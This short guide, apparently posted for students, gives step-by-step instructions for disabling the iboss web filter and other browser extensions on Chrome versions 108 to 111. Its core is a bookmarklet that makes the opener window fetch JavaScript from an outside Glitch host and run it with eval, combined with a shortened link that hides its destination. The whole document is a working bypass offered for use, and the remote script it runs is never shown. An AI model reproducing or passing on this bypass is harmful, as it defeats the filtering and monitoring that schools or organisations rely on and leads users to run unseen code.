## Disclaimer: this only works for iboss, if you want one for securely dm me. Also you need bookmarks enabled. Works on v108 to v111 (tested). ##

Step 1. Bookmark this code: 
javascript:opener.fetch("https://uboss.glitch.me/cod.js").then(data=>{data.text().then(e=>{eval(e)})})


Step 2. Go to  https://tinyurl.com/byeswamp.

Step 3. Click the blue link there.

Now, click on the bookmark. It should close a tab and open another tab. You should be on a tab that says "uboss" on it.
Now you can disable iboss, and other extensions.
